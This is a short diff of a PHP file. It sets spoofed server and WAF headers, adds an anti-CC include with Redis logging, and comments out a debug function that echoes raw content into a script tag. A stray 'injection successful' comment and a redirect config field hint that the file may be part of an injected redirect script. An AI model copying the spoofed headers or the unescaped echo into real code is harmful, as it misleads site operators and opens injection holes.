@@ -2,13 +2,20 @@
 header("X-Powered-By:ALC_SmileLang");
 header("Server:ALC_WebServer");
 header("Waf:ALC_WAF_0xf2");
-
+include_once("Anti_CC.php");
 include_once("ZSConfig.php");
-//echo $zkInfo["domain"]."---".$_SERVER['HTTP_HOST'] . strcmp($_SERVER['HTTP_HOST'], $zkInfo["domain"]);
-function zlog($content)
-{
-    echo '<script>console.log("' . $content . '")</script>';
+if($zkInfo["cc"]=="1"){
+    log_redis();
+//    zlog("cc1");
+}else{
+//    zlog("cc0");
 }
+
+//echo $zkInfo["domain"]."---".$_SERVER['HTTP_HOST'] . strcmp($_SERVER['HTTP_HOST'], $zkInfo["domain"]);
+//function zlog($content)
+//{
+//    echo '<script>console.log("' . $content . '")</script>';
+//}
 ob_start();
 //zlog("注入成功-->");
 //zlog($zkInfo["ip"].$zkInfo["domain"].$zkInfo["redirect"]);
